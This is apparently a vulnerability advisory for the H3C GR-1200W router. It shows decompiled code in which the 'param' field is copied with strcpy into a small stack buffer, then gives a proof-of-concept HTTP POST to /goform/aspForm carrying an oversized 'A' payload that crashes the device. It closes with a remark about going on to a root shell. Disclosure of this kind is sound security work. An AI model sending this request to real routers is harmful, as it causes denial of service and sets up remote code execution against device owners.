### Affected product

```
H3C GR-1200W
```
In function sub_4AE06C,the content obtained by the program from the parameter "param" is passed to v2 .Then the v2 is directly copied into the v3 stack through the strcpy function.
There is no size check, so there is a stack overflow vulnerability.The attacker can easily perform a Deny of Service Attack or Remote Code 
Execution with carefully crafted overflow data.

### Detail

```c
int __fastcall sub_4AE06C(int a1)
{
  const char *v2; // [sp+1Ch] [+1Ch]
  int v3[8]; // [sp+20h] [+20h] BYREF
  char v4[64]; // [sp+40h] [+40h] BYREF

  v3[0] = 0;
  v3[1] = 0;
  v3[2] = 0;
  v3[3] = 0;
  v3[4] = 0;
  v3[5] = 0;
  v3[6] = 0;
  v3[7] = 0;
  memset(v4, 0, sizeof(v4));
  v2 = (const char *)sub_4E58C8(a1, "param", &unk_4FFD30);
  strcpy((char *)v3, v2);
  CFG_Set(0, 507252736, v3);
  if ( atoi((const char *)v3) )
  {
    if ( atoi((const char *)v3) == 1 )
      CFG_Set(0, 520359938, "192.168.1.251;255.255.255.0;VLAN1;2");
  }
  else
  {
    CFG_Set(0, 520359938, v4);
  }
  return 0;
}
```
### POC

```python
POST /goform/aspForm HTTP/1.1
Host: 192.168.0.11:80
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: https://121.226.152.63:8443/router_password_mobile.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 553
Origin: https://192.168.0.124:80
DNT: 1
Connection: close
Cookie: JSESSIONID=5c31d502
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

CMD=set_tftp_upgrad&param=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,;

```




You can see the router crash, and finally we can write an exp to get a root shell
